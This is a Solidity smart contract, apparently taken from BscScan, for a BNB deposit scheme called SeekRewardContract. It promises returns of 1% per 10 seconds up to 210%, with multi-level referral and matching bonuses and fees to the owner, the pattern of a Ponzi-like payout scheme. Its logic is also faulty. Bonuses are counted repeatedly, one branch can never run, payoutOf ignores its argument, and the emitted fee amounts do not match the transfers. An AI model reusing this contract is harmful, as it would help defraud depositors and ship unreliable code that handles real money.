/**
 *Submitted for verification at BscScan.com on 2021-10-05
*/

pragma solidity 0.8.7;


// SPDX-License-Identifier:MIT
interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  // getRoundData and latestRoundData should both raise "No data present"
  // if they do not have data to report, instead of returning unset values
  // which could be misinterpreted as actual reported values.
  function getRoundData(uint80 _roundId)
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
  }


  contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: Kovan
     * Aggregator: ETH/USD
     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331
     */
    constructor() {
        priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return price;
    }
  }



  contract SeekRewardContract is PriceConsumerV3 {
	using SafeMath for uint256;
    address payable public owner;
	uint256 constant public INVEST_MIN_AMOUNT = 50e18;
	uint256 constant public BASE_PERCENT = 10;
	uint256[] public REFERRAL_PERCENTS = [100, 50];
	uint256 constant public PERCENTS_DIVIDER = 1000;
// 	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 10 seconds;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;


	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 referrals;
		address upline;
		uint256 bonus;
		uint256 matchBonus;
		uint256 remaining;

	}

	mapping (address => User) public users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable _owner)  {
	    owner=_owner;
	}
	
	
	function getUsdt(uint256 _value)view public returns(uint256){
     return(_value/uint256(getLatestPrice()))*1e8;   
    }
    
    function getbnb(uint256 _value)view public returns(uint256){
        return(_value.mul(uint256(getLatestPrice())).div(1e8));
    }

	function _deposit(address referrer) public payable {
		require(msg.value >= getUsdt(INVEST_MIN_AMOUNT));
       owner.transfer(msg.value.mul(2).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(2).div(100));

		User storage user = users[msg.sender];

		if (user.upline == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.upline = referrer;
		}
		else{
		    user.upline=owner;
		}

		if (user.upline != address(0)) {

			address upline = user.upline;
			for (uint256 i = 0; i < 2; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].upline;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}
    
		user.deposits.push(Deposit(msg.value, 0, block.timestamp));
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, msg.value);

	}

	function withdraw() public {
		User storage user = users[msg.sender];

        address payable  userAddress=   payable(msg.sender);
		uint256 totalAmount;
		uint256 dividends;
		uint256 _remaining;
		uint256 _bonues=getBonuses(userAddress);



		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)) {

				if (block.timestamp > user.deposits[i].start) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} 
				dividends=dividends.add(user.remaining).add(_bonues);
						user.deposits[i].start = block.timestamp;
						


				if (user.deposits[i].withdrawn.add(dividends) > (user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)) {
				    _remaining=(user.deposits[i].withdrawn.add(dividends).sub((user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)));
					dividends = ((user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
				}
               					user.remaining= _remaining;
				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}

			user.bonus = 0;
			user.matchBonus=0;
			
	
		
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}


       _matchBonus(userAddress,totalAmount);
		userAddress.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(userAddress, totalAmount);

	}
	
	function getBonuses(address _userAddress)view public returns(uint256){
	    uint256 _bonues;
	    _bonues=_bonues.add(users[_userAddress].matchBonus.add(users[_userAddress].bonus));
	    return _bonues;
	}
	
	function _matchBonus(address _user, uint256 _amount) private {
        address up = users[_user].upline;
        for (uint i = 1; i <= 15; i++) { // For matching bonus
            if (up == address(0)) 
            
            users[owner].matchBonus = users[owner].matchBonus.add(_amount); 
            
            if (i==5 && i==6) {
                    if(users[up].referrals >= 5){
                        

                
                                users[up].matchBonus = users[up].matchBonus.add(_amount);
                    
            
                    }
            }
                
                if (i>=11) {
                    if(users[up].referrals >= 10){
                        
                        
             
                    users[up].matchBonus = users[up].matchBonus.add(_amount);
                    
            }

                    
                
                }
                else if (users[up].referrals >= i+1) {
                    
                    
                               
             
                    users[up].matchBonus = users[up].matchBonus.add(_amount);
                    
                }
                    
                
                else {
                 users[owner].matchBonus = users[owner].matchBonus.add(_amount);    
                }
                
                up = users[up].upline;
            }
            
            
        }
    


	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}


	function payoutOf(address userAddress) public view returns (uint256,uint256 ) {
		User storage user = users[userAddress];

	   userAddress=(msg.sender);
		uint256 totalAmount;
		uint256 dividends;
		uint256 _remaining;
		uint256 _bonues=getBonuses(userAddress);



		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)) {

				if (block.timestamp > user.deposits[i].start) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} 
				dividends=dividends.add(user.remaining).add(_bonues);

				if (user.deposits[i].withdrawn.add(dividends) > (user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)) {
				    _remaining=(user.deposits[i].withdrawn.add(dividends).sub((user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)));
					dividends = ((user.deposits[i].amount.mul(210)).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
				}

				totalAmount = totalAmount.add(dividends);

			}
		}
		
		return (totalAmount,_remaining);

	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].upline;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < (user.deposits[user.deposits.length-1].amount.mul(210)).div(PERCENTS_DIVIDER)) {
				return true;
			}
		}
		return false;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
		    if(isActive(userAddress)){
			amount = amount.add(user.deposits[i].amount);
		    }
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
		    if(isActive(userAddress)){
			amount = amount.add(user.deposits[i].withdrawn);
		}
     }
		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}